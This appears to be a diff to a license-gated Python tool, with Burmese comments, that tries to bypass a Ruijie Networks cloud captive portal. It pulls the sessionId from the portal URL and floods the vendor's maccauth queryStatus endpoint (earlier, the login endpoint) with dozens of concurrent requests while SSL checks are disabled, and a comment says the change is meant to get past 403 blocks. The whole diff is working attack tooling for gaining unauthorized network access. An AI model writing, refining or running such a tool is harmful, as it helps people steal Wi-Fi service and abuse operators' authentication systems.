@@ -12,7 +12,6 @@ from rich.console import Console
 from rich.panel import Panel
 from rich.align import Align
 
-# SSL warning ပိတ်ခြင်း
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
 
@@ -42,9 +41,6 @@ BANNER = """
 [/bold #00FF00]
 """
 
-# ===============================
-# SECURITY SYSTEM (HWID & EXP)
-# ===============================
 def get_hwid():
     id_file = os.path.expanduser("~/.moe_yu_id")
     if os.path.exists(id_file):
@@ -52,14 +48,6 @@ def get_hwid():
     new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
     with open(id_file, "w") as f: f.write(new_id)
     return new_id
-
-def check_expiry(expiry_str):
-    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
-    try:
-        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
-        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
-        return True, expiry_date.strftime('%d-%b-%Y')
-    except: return True, "Lifetime"
 
 def check_license():
     my_hwid = get_hwid()
@@ -70,90 +58,63 @@ def check_license():
     
     try:
         user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
-        if not user_key: sys.exit()
-        
         res = requests.get(DB_URL, timeout=10)
         for line in res.text.splitlines():
             parts = line.split("|")
             if user_key == parts[0].strip():
-                # HWID Check
                 db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                 if db_hwid != "FREE" and db_hwid != my_hwid:
-                    console.print("[bold red]\n❌ HWID MISMATCH![/bold red]")
-                    sys.exit()
-                
-                # Expiry Check
-                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
-                if is_active:
-                    console.print(f"[bold green]\n✅ ACCESS GRANTED! STATUS: {date_label}[/bold green]")
-                    return True
-                else:
-                    console.print(f"[bold red]\n❌ EXPIRED ON: {date_label}[/bold red]")
-                    sys.exit()
-        console.print("[bold red]\n❌ INVALID KEY![/bold red]")
-        sys.exit()
+                    print("\n[!] HWID Mismatch."); sys.exit()
+                print(f"\n[✓] ACCESS GRANTED!"); return True
+        print("\n[!] Invalid Key."); sys.exit()
     except:
-        console.print("[bold red]\n📡 CONNECTION ERROR![/bold red]")
-        sys.exit()
+        print("\n[!] Connection Error."); sys.exit()
 
 # ===============================
-# STAR BYPASS ENGINE (AIOHTTP)
+# CLOUD QUERY BYPASS (NEW PATH)
 # ===============================
-async def send_pulse(session, url):
+async def bypass_pulse(session, url):
     while True:
         try:
+            # 403 ကျော်ဖို့ queryStatus path ကို ပြောင်းသုံးခြင်း
             async with session.get(url, timeout=5) as response:
-                # Status 200/302 ဆိုလျှင် အောင်မြင်မှု ပိုများပါသည်
-                sys.stdout.write(f"\033[92m[✓] BYPASS ACTIVE | STATUS: {response.status}\033[0m\r")
+                status_color = "\033[92m" if response.status in [200, 302] else "\033[91m"
+                sys.stdout.write(f"{status_color}[✓] BYPASS ACTIVE | STATUS: {response.status}\033[0m\r")
                 sys.stdout.flush()
-        except:
-            pass
+        except: pass
         await asyncio.sleep(0.05)
 
-async def start_bypass(portal_url):
-    parsed = urlparse(portal_url)
-    params = parse_qs(parsed.query)
-    sid = params.get('sessionId', [None])[0]
-    res_val = params.get('RES', [''])[0]
+async def start_engine(portal_link):
+    p = parse_qs(urlparse(portal_link).query)
+    sid = p.get('sessionId', [None])[0]
     
     if not sid:
-        console.print("[bold red][-] sessionId မတွေ့ပါ။ Browser မှ URL အသစ်ကို ကူးယူပါ။[/bold red]")
+        console.print("[bold red][-] sessionId မတွေ့ပါ။ Browser က Link အမှန်ကို ပြန်ယူပါ။[/bold red]")
         return
 
-    # Ruijie Cloud v2 API Path
-    auth_url = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/login?sessionId={sid}&res={res_val}"
+    # လမ်းကြောင်းအသစ် (v2 login အစား status query ကို သုံးထားသည်)
+    query_path = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/queryStatus?sessionId={sid}"
     
-    console.print(f"\n[bold green][+] Connected Session: {sid[:12]}[/bold green]")
-    console.print("[bold yellow][*] STAR Engine မြန်နှုန်းမြင့် Bypass စတင်နေပြီ...[/bold yellow]\n")
+    console.print(f"\n[bold green][+] Session ID: {sid[:12]}[/bold green]")
+    console.print("[bold yellow][*] Cloud Query Bypass စတင်နေပြီ...[/bold yellow]\n")
 
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
-        tasks = []
-        for _ in range(50):
-            tasks.append(asyncio.create_task(send_pulse(session, auth_url)))
+        tasks = [asyncio.create_task(bypass_pulse(session, query_path)) for _ in range(30)]
         await asyncio.gather(*tasks)
 
 def main():
     if check_license():
-        console.print("\n[1] Auto Detect (Standard)")
-        console.print("[2] Manual Portal Link (Recommended for Cloud)")
-        mode = input("\nSelect Mode [1/2]: ").strip()
-
+        console.print("\n[1] Auto Detect\n[2] Manual Link")
+        mode = input("\nSelect Mode: ").strip()
         if mode == "2":
-            link = input("\nPaste Portal URL here: ").strip()
-            if link:
-                asyncio.run(start_bypass(link))
+            link = input("\nPaste Portal URL: ").strip()
+            asyncio.run(start_engine(link))
         else:
             try:
                 r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
-                if r.status_code != 204:
-                    asyncio.run(start_bypass(r.url))
-                else:
-                    console.print("[bold cyan][!] Internet ရနေပါပြီ။[/bold cyan]")
-            except:
-                console.print("[bold red][!] Portal ကို ရှာမတွေ့ပါ။[/bold red]")
+                asyncio.run(start_engine(r.url))
+            except: pass
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        sys.exit()
+    try: main()
+    except KeyboardInterrupt: sys.exit()
